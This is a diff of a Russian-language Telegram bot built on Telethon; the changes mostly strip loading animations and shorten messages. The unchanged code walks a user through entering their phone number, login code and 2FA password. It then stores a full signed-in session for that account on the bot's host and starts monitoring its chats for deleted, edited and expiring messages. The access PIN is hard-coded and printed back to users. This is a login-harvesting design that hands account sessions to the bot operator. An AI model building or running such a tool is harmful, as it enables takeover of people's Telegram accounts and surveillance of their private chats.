@@ -24,36 +24,18 @@ bot = TelegramClient('bot', API_ID, API_HASH)
 
 # ========== БАЗА ДАННЫХ ==========
 users_db = {}  # {user_id: {'phones': [], 'active_client': None, 'settings': {}}}
-user_sessions = {}  # Временные сессии для входа
-authorized_users = set()  # Кто ввёл пин-код
+user_sessions = {}
+authorized_users = set()
 ACCESS_PIN = "5482"
-message_cache = {}  # Кэш сообщений для мониторинга
-user_clients = {}  # Активные клиенты после входа
-timers = {}  # Таймеры
-flood_until = {}  # Блокировки
-user_contacts = {}  # Временные контакты
-
-# ========== ФУНКЦИИ АНИМАЦИИ ==========
-async def show_progress(event, text, steps=10, delay=0.3):
-    msg = await event.reply(f"🦆 **{text}**\n\n[                    ] 0%")
-    for i in range(steps + 1):
-        percent = i * 10
-        bar = '█' * i + '░' * (steps - i)
-        await msg.edit(f"🦆 **{text}**\n\n[{bar}] {percent}%")
-        await asyncio.sleep(delay)
-    return msg
-
-async def show_loading(event, text, duration=3):
-    frames = ['🦆⠋', '🦆⠙', '🦆⠹', '🦆⠸', '🦆⠼', '🦆⠴', '🦆⠦', '🦆⠧']
-    msg = await event.reply(f"{frames[0]} {text}")
-    for i in range(duration * 2):
-        await msg.edit(f"{frames[i % len(frames)]} {text}")
-        await asyncio.sleep(0.5)
-    return msg
+message_cache = {}
+user_clients = {}
+timers = {}
+flood_until = {}
+user_contacts = {}
 
 # ========== ТАЙМЕРЫ ==========
 async def show_unlock_timer(event, user_id, seconds):
-    msg = await event.reply("🦆 **⏳ Загружаю таймер...**")
+    msg = await event.reply("⏳ **Загружаю таймер...**")
     unlock_time = datetime.now() + timedelta(seconds=seconds)
     flood_until[user_id] = unlock_time
     
@@ -66,14 +48,13 @@ async def show_unlock_timer(event, user_id, seconds):
         bar = '█' * progress + '░' * (20 - progress)
         
         await msg.edit(
-            f"🦆 **🔒 НОМЕР ЗАБЛОКИРОВАН**\n\n"
+            f"🔒 **НОМЕР ЗАБЛОКИРОВАН**\n\n"
             f"⏱ **{hours:02d}:{minutes:02d}:{secs:02d}**\n"
-            f"└ {bar}\n\n"
-            f"❌ Слишком много попыток"
+            f"└ {bar}"
         )
         await asyncio.sleep(1)
     
-    await msg.edit("🦆 **✅ НОМЕР РАЗБЛОКИРОВАН!**")
+    await msg.edit("✅ **НОМЕР РАЗБЛОКИРОВАН!**")
     if user_id in flood_until:
         del flood_until[user_id]
 
@@ -104,7 +85,7 @@ def stop_timer(user_id):
 # ========== СОХРАНЕНИЕ НОМЕРОВ ==========
 async def save_user_phone(user_id, phone):
     if user_id not in users_db:
-        users_db[user_id] = {'phones': [], 'active_client': None, 'settings': {}}
+        users_db[user_id] = {'phones': [], 'active_client': None}
     if phone not in users_db[user_id]['phones']:
         users_db[user_id]['phones'].append(phone)
         users_db[user_id]['phones'] = users_db[user_id]['phones'][-5:]
@@ -125,9 +106,9 @@ async def handler(event):
     if user_id not in authorized_users:
         if text == ACCESS_PIN:
             authorized_users.add(user_id)
-            await show_progress(event, "Загрузка", 5, 0.2)
             await event.reply(
-                f"🦆 **✅ Пин-код верный!**",
+                f"✅ **Пин-код верный!**\n\n"
+                f"👇 **Выбери действие:**",
                 buttons=[
                     [Button.text("📱 Отправить контакт", resize=True)],
                     [Button.text("📞 Ввести номер")],
@@ -135,13 +116,13 @@ async def handler(event):
                 ]
             )
         else:
-            await event.reply(f"🔐 **Введи пин-код:** `5482`")
+            await event.reply(f"🔐 **Неверный пин-код!**\nВведи: `5482`")
         return
 
     # === ГЛАВНОЕ МЕНЮ ===
     if text == "/start":
         await event.reply(
-            f"🦆 **Главное меню**",
+            f"📱 **Главное меню**",
             buttons=[
                 [Button.text("📱 Отправить контакт")],
                 [Button.text("📞 Ввести номер")],
@@ -153,7 +134,7 @@ async def handler(event):
     # === ОТПРАВИТЬ КОНТАКТ ===
     if text == "📱 Отправить контакт":
         await event.reply(
-            f"📱 **Поделись контактом:**",
+            f"📱 **Нажми кнопку:**",
             buttons=[[Button.request_contact("📞 Поделиться контактом")]]
         )
         return
@@ -161,7 +142,7 @@ async def handler(event):
     # === ВВЕСТИ НОМЕР ===
     if text == "📞 Ввести номер":
         user_sessions[user_id] = {'step': 'waiting_phone'}
-        await event.reply("📞 **Введи номер:** +79001234567")
+        await event.reply("📞 **Введи номер:**\n`+79001234567`")
         return
 
     # === МОИ НОМЕРА ===
@@ -212,7 +193,7 @@ async def process_phone(event, user_id, phone):
     user_sessions[user_id] = {'phone': phone, 'step': 'waiting_code'}
     await save_user_phone(user_id, phone)
     
-    anim = await show_loading(event, "Подключение...", 2)
+    msg = await event.reply("🔄 **Подключаюсь к Telegram...**")
     
     try:
         client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
@@ -222,14 +203,14 @@ async def process_phone(event, user_id, phone):
         user_sessions[user_id]['client'] = client
         user_sessions[user_id]['code_hash'] = sent.phone_code_hash
         
-        await anim.edit("✅ **Код отправлен!**")
+        await msg.edit("✅ **Код отправлен!**")
         await start_code_timer(user_id, event.chat_id, 120)
         
     except FloodWaitError as e:
         await show_unlock_timer(event, user_id, e.seconds)
         del user_sessions[user_id]
     except Exception as e:
-        await anim.edit(f"❌ **Ошибка:** {e}")
+        await msg.edit(f"❌ **Ошибка:** {e}")
         del user_sessions[user_id]
 
 # ========== ОБРАБОТКА КОДА ==========
@@ -238,14 +219,14 @@ async def process_code(event, user_id, code):
     client = session['client']
     stop_timer(user_id)
     
-    anim = await show_loading(event, "Проверка...", 2)
+    msg = await event.reply("🔑 **Проверяю код...**")
     
     try:
         await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
         me = await client.get_me()
         user_clients[user_id] = client
         
-        await anim.edit(
+        await msg.edit(
             f"✅ **Вход выполнен!**\n\n"
             f"👤 @{me.username}\n"
             f"🔍 **Мониторинг запущен!**"
@@ -255,16 +236,16 @@ async def process_code(event, user_id, code):
         
     except SessionPasswordNeededError:
         user_sessions[user_id]['step'] = 'waiting_2fa'
-        await anim.edit("🔐 **Введи пароль 2FA:**")
+        await msg.edit("🔐 **Введи пароль 2FA:**")
     except PhoneCodeInvalidError:
-        await anim.edit("❌ **Неверный код!**")
+        await msg.edit("❌ **Неверный код!**")
         user_sessions[user_id]['step'] = 'waiting_code'
         await start_code_timer(user_id, event.chat_id, 120)
     except PhoneCodeExpiredError:
-        await anim.edit("⌛ **Код истёк!**")
+        await msg.edit("⌛ **Код истёк!**")
         del user_sessions[user_id]
     except Exception as e:
-        await anim.edit(f"❌ **Ошибка:** {e}")
+        await msg.edit(f"❌ **Ошибка:** {e}")
         del user_sessions[user_id]
 
 # ========== ОБРАБОТКА 2FA ==========
@@ -272,14 +253,14 @@ async def process_2fa(event, user_id, password):
     session = user_sessions[user_id]
     client = session['client']
     
-    anim = await show_loading(event, "Проверка...", 2)
+    msg = await event.reply("🔐 **Проверяю пароль...**")
     
     try:
         await client.sign_in(password=password)
         me = await client.get_me()
         user_clients[user_id] = client
         
-        await anim.edit(
+        await msg.edit(
             f"✅ **Вход с 2FA выполнен!**\n\n"
             f"👤 @{me.username}\n"
             f"🔍 **Мониторинг запущен!**"
@@ -287,7 +268,7 @@ async def process_2fa(event, user_id, password):
         del user_sessions[user_id]
         asyncio.create_task(monitor_user_chats(user_id, client))
     except Exception as e:
-        await anim.edit(f"❌ **Ошибка:** {e}")
+        await msg.edit(f"❌ **Ошибка:** {e}")
 
 # ========== ОБРАБОТКА КОНТАКТА ==========
 @bot.on(events.NewMessage(func=lambda e: e.message.contact))
@@ -339,17 +320,17 @@ async def monitor_user_chats(user_id, client):
     
     @client.on(events.MessageDeleted)
     async def on_delete(event):
-        for msg_id in event.deleted_ids:
-            await bot.send_message(user_id, f"🗑 **Удалено:** {msg_id}")
+        await bot.send_message(user_id, f"🗑 **Удалено** {len(event.deleted_ids)} сообщений")
     
     @client.on(events.MessageEdited)
     async def on_edit(event):
-        await bot.send_message(user_id, f"✏️ **Изменено:** {event.message.text}")
+        if event.message.text:
+            await bot.send_message(user_id, f"✏️ **Изменено:** {event.message.text[:100]}")
     
     @client.on(events.NewMessage)
     async def on_new(event):
         if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
-            await bot.send_message(user_id, f"⏳ **Истекающее сообщение** в чате {event.chat_id}")
+            await bot.send_message(user_id, f"⏳ **Истекающее сообщение**")
     
     await client.run_until_disconnected()
 
